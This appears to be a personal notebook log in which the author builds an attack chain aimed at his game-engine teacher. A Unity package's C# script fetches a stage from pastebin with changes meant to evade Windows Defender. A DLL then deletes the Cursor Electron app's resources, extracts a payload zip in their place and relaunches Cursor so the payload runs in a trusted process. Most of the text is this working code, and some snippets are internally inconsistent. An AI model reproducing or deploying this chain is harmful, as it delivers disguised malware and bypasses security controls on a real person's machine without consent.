


okay so, the entire reason why this story started in the first place was because well I was bored and I wanted to hack my games engine teacher for..... reasons that cannot be disclosed which I did not do nor will I ever attempt to.... Bbbbbbuuuttttt if I did... then this is how I would go about it

I would probably provide a zip file which contains a zip file that contains the payloads and the Unity Package that's needed


IDGAF:
C# Unity script -> Unzip the file -> execute the package -> The Unity Scene runs the Scripts -> The scripts then call the DLL  -> The DLL Initially Backups up the resource folder -> then delete the electron's resource folder -> proceeds to unzip the contents of the zip file to said resource directory -> launches the cursor application.

OPSEC & Efficient:
C# Unity script -> pastebin.exe -> download initial script -> base64 decode second script -> Unzip the Payloads file -> run the vulnerable electron app -> delete the zip file and payloads



![[Red teaming a game studio!-20250521175050964.webp|710]]


![[Red teaming a game studio!-20250521180542044.webp|731]]


// so we can just use certutil right?

![[Red teaming a game studio!-20250521180011955.webp|846]]




// should work right!!!

// excuse me what the actual fuck

![[Red teaming a game studio!-20250521180053943.webp|883]]

// HUH

![[Red teaming a game studio!-20250521180109716.webp]]



// excuse me what


![[Red teaming a game studio!-20250521180416569.webp]]\



![[Red teaming a game studio!-20250521180451800.webp]]


![[Red teaming a game studio!-20250521180523093.webp]]



so we modify it to evade defender 


```C#
using UnityEngine;
using System.Net.Http;
using System.IO;
using System.Threading.Tasks;

public class Transfer : MonoBehaviour
{
    private static readonly HttpClient httpClient = new HttpClient();

    void Update()
    {
        if (Input.GetKeyDown(KeyCode.Space))
        {
            DownloadTextFile();
        }
    }

    private async void DownloadTextFile()
    {
        string url = "https://pastebin.com/raw/juryCH2d";
        string fileName = "test.txt";
        string filePath = Path.Combine(Application.persistentDataPath, fileName);

        byte[] fileBytes = await httpClient.GetByteArrayAsync(url);
        await File.WriteAllBytesAsync(filePath, fileBytes);
        string TextInside = System.Text.Encoding.UTF8.GetString(fileBytes, 0, fileBytes.Length);
        Debug.Log($"File downloaded to: {filePath} + The content inside of it is {TextInside} ");
    }
}

```


and it works!!

![[Red teaming a game studio!-20250521191511175.webp|991]]




so now im trying to get a DLL to execute all my shit


https://youtu.be/CPkO1Gek8XQ


I also created a DLL using visual studio

![[Red teaming a game studio!-20250521200406117.webp|951]]



## DLL Code

DLL code; idk how it worked its fucking magic investigate tomorrow


```C#
using UnityEngine;

namespace RedTeamingDLL
{
    public class Dummy:MonoBehaviour
    {
        public static int Add(int a, int b)
        {
            return a + b;
        }
    }
}

```



## The Script to Test the DLL

```C#
using UnityEngine;
using RedTeamingDLL;

namespace Assets.Scripts
{
    public class TestDLL : MonoBehaviour
    {
        void Start()
        {
        
        }
        void Update()
        {
            int sum = Dummy.Add(2, 3);
            Debug.Log("Sum is: " + sum);
        }
    }
}
```


## Proof Of Concept

![[Red teaming a game studio!-20250521233659011.webp]]




here is the next step where we essentially want to copy a test folder and it works!

```C#
using System;
using System.IO;
using UnityEngine;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace RedTeamingDLL
{
    public class Dummy:MonoBehaviour
    {
        public static string CopyLocation()
        {
			string sourcePath = @"E:\Unity\Unity Hub\resources";
			string destinationPath = @"E:\Unity\Unity Hub\resourcesBackup";


            if (!Directory.Exists(original))
            {
                return $"Source directory does not exist: {original}";
            }

            try
            {
                CopyDirectoryRecursive(original, destination);
                return $"Copied from {original} to {destination}";
            }
            catch (Exception ex)
            {
                return $"Failed to copy folder: {ex.Message}";
            }
        }

        private static void CopyDirectoryOriginalResource(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);

            // Copy files
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                var destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            // Copy subdirectories
            foreach (var dir in Directory.GetDirectories(sourceDir))
            {
                var destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
                CopyDirectoryRecursive(dir, destSubDir);
            }
        }
    }
}

```



![[Red teaming a game studio!-20250522154303407.webp]]






here we have the delete content code and we test it 

DLLTest.cs script;

```C# 
using System;
using UnityEngine;
using RedTeamingDLL;

namespace Assets.Scripts
{

    public class TestDLL : MonoBehaviour
    {
        void Start()
        {
            Debug.Log(Dummy.BackupLocation());
            Debug.Log(Dummy.DeleteContets());

        }

        void Update()
        {

        }
    }
}
```


The DLL itself;

```C#
using System;
using System.IO;
using UnityEngine;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace RedTeamingDLL
{
    public class Dummy:MonoBehaviour
    {
        public static string BackupLocation()
        {
            string original = @"E:\Unity\Unity Hub\resources";
            string destination = @"E:\Unity\Unity Hub\resourcesBackup";

            if (!Directory.Exists(original))
            {
                return $"Source directory does not exist: {original}";
            }

            try
            {
                BackupLocationFiles(original, destination);
                return $"Copied from {original} to {destination}";
            }
            catch (Exception ex)
            {   
                return $"Failed to copy folder: {ex.Message}";
            }
        }

        private static void BackupLocationFiles(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);

            // Copy files
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                var destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            // Copy subdirectories
            foreach (var dir in Directory.GetDirectories(sourceDir))
            {
                var destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
                BackupLocationFiles(dir, destSubDir);
            }
        }

        public static string DeleteContets()
        {
            string Resource1 = @"E:\Unity\Unity Hub\resources"; 
            string[] files = Directory.GetFiles(Resource1);
            foreach (var file in files)
            {
                File.Delete(file);
                Console.Write($"{file} is deleted");
            }

            return "Files Have Been Deleted";
        }


        public static string MaliciousAllocation()
        {
            string PayloadsZip = @"C:\Windows\Tracing\DatabaseStorage.zip";
            string Destination = @"E:\Unity\Unity Hub\resources";

            if (!File.Exists(PayloadsZip))
            {
                return $"The File does not exist: {PayloadsZip}";
            }
            try
            {
                BackupLocationFiles(PayloadsZip, Destination);
                return $"Copied from {PayloadsZip} to {Destination}";
            }
            catch (Exception ex)
            {
                return $"Failed to copy folder: {ex.Message}";
            }
        }

    }
}
```


![[Red teaming a game studio!-20250522172101414.webp]]



now we instead swap over to delete the contents within cursor!



```C#
using System;
using System.IO;
using UnityEngine;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace RedTeamingDLL
{
    public class Dummy:MonoBehaviour
    {
        public static string BackupLocation()
        {
            string original = Environment.ExpandEnvironmentVariables(@"%localappdata%\Programs\cursor\resources");
            string destination = Environment.ExpandEnvironmentVariables(@"%localappdata%\Programs\cursor\resourcesBackup");

            if (!Directory.Exists(original))
            {
                return $"Source directory does not exist: {original}";
            }

            try
            {
                BackupLocationFiles(original, destination);
                return $"Copied from {original} to {destination}";
            }
            catch (Exception ex)
            {   
                return $"Failed to copy folder: {ex.Message}";
            }
        }

        private static void BackupLocationFiles(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);

            // Copy files
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                var destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            // Copy subdirectories
            foreach (var dir in Directory.GetDirectories(sourceDir))
            {
                var destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
                BackupLocationFiles(dir, destSubDir);
            }
        }
		
		
// -------------------------------------------------------- THIS PART HERE WAS CHANGED THE PATH WAS CHANGED ---------------------------- //
        public static string DeleteContets()
        {
            string Resource1 = Environment.ExpandEnvironmentVariables(@"%localappdata%\Programs\cursor\resources");
            string[] files = Directory.GetFiles(Resource1);
            foreach (var file in files)
            {
                File.Delete(file);
            }

            return $"Files Have Been deleted at {Resource1}";
        }
// ---------------------------------------------------------------------------------------------------------------- //

        public static string MaliciousAllocation()
        {
            string PayloadsZip = @"C:\Windows\Tracing\DatabaseStorage.zip";
            string Destination = @"E:\Unity\Unity Hub\resources";

            if (!File.Exists(PayloadsZip))
            {
                return $"The File does not exist: {PayloadsZip}";
            }
            try
            {
                BackupLocationFiles(PayloadsZip, Destination);
                return $"Copied from {PayloadsZip} to {Destination}";
            }
            catch (Exception ex)
            {
                return $"Failed to copy folder: {ex.Message}";
            }
        }

    }
}

```





![[Red teaming a game studio!-20250522181126524.webp]]



Files Deleted succesfully!! so now we do the part where we MOVE all of contents from inside of the ZIP file to the resources folder of cursor


```C#
 public static string ExtractDiskHardDisk()
 {
     string zipFilePath = @"F:\Git\Loki\app.zip";
     string extractToPath = Environment.ExpandEnvironmentVariables(@"%localappdata%\Programs\cursor\resources\");

     if (!File.Exists(zipFilePath))
     {
         return $"ZIP file does not exist: {zipFilePath}";
     }

     try
     {
         Directory.CreateDirectory(extractToPath);

         using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
         {
             foreach (ZipArchiveEntry entry in archive.Entries)
             {
                 string destinationPath = Path.Combine(extractToPath, entry.FullName);

                 // Create directory if needed
                 string destinationDir = Path.GetDirectoryName(destinationPath);
                 if (!Directory.Exists(destinationDir))
                 {
                     Directory.CreateDirectory(destinationDir);
                 }

                 // Skip directory entries
                 if (string.IsNullOrEmpty(entry.Name))
                     continue;

                 // Delete existing file if exists
                 if (File.Exists(destinationPath))
                 {
                     File.SetAttributes(destinationPath, FileAttributes.Normal);
                     File.Delete(destinationPath);
                 }

                 entry.ExtractToFile(destinationPath);
             }
         }

         return $"app.zip extracted to: {extractToPath}";
     }
     catch (Exception ex)
     {
         return $"Extraction failed: {ex.Message}";
     }

 }
```



![[Red teaming a game studio!-20250523130523880.webp|1006]]





```C#
        public static string RunProcess()
        {
            string PathToExe = Environment.ExpandEnvironmentVariables(@"%localappdata%\Programs\cursor\Cursor.exe");
            Process process = Process.Start(PathToExe);
            return $"Cursor Ran with the PID of {process.Id}";
        }
```


now we simply run cursor and we can see theyre not the same PID... but why though?


![[Red teaming a game studio!-20250523134158375.webp|1012]]



Why is the PID different?, this is because we are printing the PID of the parent process rather than the child process which is where cursor is being ran





![[Red teaming a game studio!-20250523134909593.webp|773]]


We can see its a child this is explained in the [Blog](https://www.ibm.com/think/x-force/bypassing-windows-defender-application-control-loki-c2) that Bobby Cooke posted... specifically this excerpt. 

"At runtime, an Electron application reads JavaScript files, interprets their code and executes them within the Electron process. The animation below demonstrates how the Microsoft Teams Electron application reads a JavaScript file at runtime, which then uses the [child_process](https://nodejs.org/api/child_process.html) module to execute **whoami.exe**.

![This gif will be used as part of an Xforce blog post on IBM.com](https://www.ibm.com/content/dam/connectedassets-adobe-cms/worldwide-content/creative-assets/iwci/ul/g/24/43/teams-electron.gif)

In this example, the Teams Electron process reads the JavaScript file, which then spawns **whoami.exe** using the **child_process** module. This module triggers the Electron process to execute its exported API [uv_spawn](https://docs.libuv.org/en/v1.x/process.html), responsible for interacting with the operating system to create a new process."

so its 



![[Red teaming a game studio!-20250526212413502.webp]]



![[Red teaming a game studio!-20250526212355753.webp]]


![[Red teaming a game studio!-20250526212532213.webp]]